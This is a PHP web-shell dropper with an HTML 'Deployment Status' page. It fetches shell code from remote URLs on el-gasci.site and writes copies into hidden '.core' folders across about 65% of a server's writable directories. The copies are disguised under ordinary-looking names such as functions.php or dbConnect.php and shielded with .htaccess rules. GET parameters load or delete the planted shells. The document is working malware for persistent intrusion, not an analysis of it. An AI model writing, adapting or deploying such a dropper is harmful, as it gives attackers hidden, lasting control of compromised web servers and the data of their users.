<?php
// ===[ SETTINGS ]===
$remote_urls = [
    'https://el-gasci.site/download/atomic.txt',
    'https://el-gasci.site/download/done.txt',
    'https://el-gasci.site/download/fox.txt'
];

$base_dir = __DIR__;
$log_file = __DIR__ . '/result.txt';

$natural_filenames = [
    'functions.php', 'admin-ajax.php', 'shortcodes.php', 'enqueue.php', 'template-tags.php',
    'helper.php', 'router.php', 'default.php', 'controller.php', 'view.html.php',
    'SubmissionHandler.inc.php', 'ArticleHandler.inc.php', 'LoginHandler.inc.php', 'UserHandler.inc.php',
    'startup.php', 'payment.php', 'shipping.php', 'total.php', 'voucher.php',
    'appLoader.php', 'reactEntry.php', 'appData.php', 'componentInit.php', 'renderUtils.php',
    'apiHandler.php', 'routeConfig.php', 'dbConnect.php', 'middleware.php', 'sessionInit.php',
    'tools.php', 'submitAction.php', 'formLoader.php', 'eventListener.php', 'ajaxHelper.php',
    'sanitize.php', 'userUtils.php', 'emailDispatcher.php', 'logger.php', 'tokenHandler.php'
];

// ===[ Logging Function ]===
function logPath($log_file, $message) {
    $timestamp = date('Y-m-d H:i:s');
    $formatted = "[$timestamp] $message\n";
    echo $formatted;
    $result = @file_put_contents($log_file, $formatted, FILE_APPEND | LOCK_EX);
    if ($result === false) {
        echo "[ERROR] Gagal menulis log ke file: $log_file\n";
    }
}

// ===[ Get Writable Directories ]===
function getAllValidDirs($base) {
    $dirs = [];
    $rii = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($base, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($rii as $file) {
        if ($file->isDir()) {
            $path = $file->getPathname();
            if (preg_match('#/(\.git|\.idea|vendor|node_modules)#i', $path)) continue;
            $dirs[] = $path;
        }
    }
    return array_unique($dirs);
}

// ===[ Drop Shell ]===
function dropShell($remote_url, $target_dir, $log_file) {
    global $natural_filenames;

    $shell_code = @file_get_contents($remote_url);
    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        $ch = curl_init($remote_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (ShellDropper)',
        ]);
        $shell_code = curl_exec($ch);
        curl_close($ch);
    }

    if (!$shell_code || strlen(trim($shell_code)) < 10) {
        logPath($log_file, "[ERROR] Gagal mengambil shell dari URL: $remote_url");
        return false;
    }

    // Create hidden folder
    $hidden_dir = rtrim($target_dir, '/\\') . DIRECTORY_SEPARATOR . '.core';
    if (!is_dir($hidden_dir)) {
        if (!@mkdir($hidden_dir, 0755, true)) {
            logPath($log_file, "[DENIED] Tidak bisa membuat folder: $hidden_dir");
            return false;
        }
    }

    // Add .htaccess
    $htaccess_path = $hidden_dir . '/.htaccess';
    if (!file_exists($htaccess_path)) {
        @file_put_contents($htaccess_path, "Options -Indexes\nDeny from all\n");
    }

    // Choose filename
    $filename = $natural_filenames[array_rand($natural_filenames)];
    $fullpath = $hidden_dir . DIRECTORY_SEPARATOR . $filename;

    if (file_exists($fullpath)) {
        logPath($log_file, "[SKIP] File sudah ada: $fullpath");
        return false;
    }

    if (!is_writable($hidden_dir)) {
        logPath($log_file, "[DENIED] Tidak bisa menulis ke direktori: $hidden_dir");
        return false;
    }

    $result = @file_put_contents($fullpath, $shell_code);
    if ($result === false) {
        logPath($log_file, "[FAIL] Gagal menulis ke file: $fullpath");
        return false;
    }

    $real = realpath($fullpath);
    logPath($log_file, "[OK] Berhasil drop: $real");
    return $real;
}

// ===[ Load Dropped Shells ]===
function loadShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) include_once $path;
        }
    }
}

// ===[ Clean Shells ]===
function cleanShells($log_file) {
    if (!file_exists($log_file)) return;
    foreach (file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (preg_match('/\] (.+)$/', $line, $m)) {
            $path = trim($m[1]);
            if (is_file($path)) @unlink($path);
        }
    }
    @unlink($log_file);
}

// ===[ GET Triggers ]===
if (isset($_GET['load']) && $_GET['load'] === 'true') {
    loadShells($log_file);
    echo "✅ Loaded all shells.\n";
    exit;
}
if (isset($_GET['clean']) && $_GET['clean'] === 'true') {
    cleanShells($log_file);
    echo "🧹 Cleaned all dropped shells.\n";
    exit;
}

// ===[ MAIN EXECUTION ]===
$dirs = getAllValidDirs($base_dir);
shuffle($dirs);

$total_targets = count($dirs);
$spread_count = (int) ceil($total_targets * 0.65);
$targets = array_slice($dirs, 0, $spread_count);

$batch_size = ceil($spread_count / count($remote_urls));

$success = 0;
foreach ($targets as $i => $dir) {
    $remote_url = $remote_urls[floor($i / $batch_size) % count($remote_urls)];
    logPath($log_file, "[DEBUG] Target: $dir/.core | Menggunakan shell: $remote_url");
    if (dropShell($remote_url, $dir, $log_file)) {
        $success++;
    } else {
        logPath($log_file, "[DEBUG] Gagal drop ke: $dir");
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Deployment Status</title>
  <style>
    body {
      background-color: #111;
      color: #e0e0e0;
      font-family: 'Segoe UI', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      min-height: 100vh;
    }

    .container {
      max-width: 800px;
      text-align: center;
    }

    .title {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: #90ee90;
    }

    .gif-container img {
      width: 400px;
      max-width: 90%;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,255,100,0.3);
      margin-bottom: 30px;
    }

    .details p {
      font-size: 15px;
      margin: 6px 0;
      color: #a4ff7a;
    }

    .footer {
      margin-top: 30px;
      font-size: 13px;
      color: #666;
    }

    .icon-check {
      width: 24px;
      height: 24px;
      fill: #90ee90;
    }

    .atomic-logo {
      font-size: 72px;
      font-weight: bold;
      font-family: 'Courier New', monospace;
      color: #ff3cac;
      text-align: center;
      text-shadow:
        0 0 5px #ff3cac,
        0 0 15px #ff3cac,
        0 0 30px #ff3cac,
        0 0 60px #ff3cac;
      animation: flicker 1.5s infinite alternate;
      margin-top: 50px;
    }

    @keyframes flicker {
      from { opacity: 1; }
      to   { opacity: 0.75; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">
      <svg class="icon-check" viewBox="0 0 24 24">
        <path d="M9 16.2l-4.2-4.2-1.4 1.4L9 19 21 7l-1.4-1.4z"/>
      </svg>
      <p>Deploy On Proceed</p>
    </div>

    <div class="gif-container">
      <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExYXAzdXc3YWkxc2pyanp2bG5kbW1vdmMzZmc2ejExaXBmMGtnMG1kNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/JJ7kWeCHDHaleKNj64/giphy.gif" alt="Shell Dropped">
    </div>

    <div class="details">
      <p>Shells dropped into ~65% of writable folders</p>
      <p>Variants used: <strong><?= count($remote_urls); ?></strong> shell(s)</p>
      <p>Successfully dropped: <strong><?= $success; ?></strong> file(s)</p>
      <p>Log file: <code><?= htmlspecialchars($log_file); ?></code></p>
    </div>

    <div class="footer">
      Version: 2.3.0 &nbsp;|&nbsp; Updated: July 2025
    </div>

    <div class="atomic-logo">I AM ATOMIC</div>
  </div>
</body>
</html>
?>

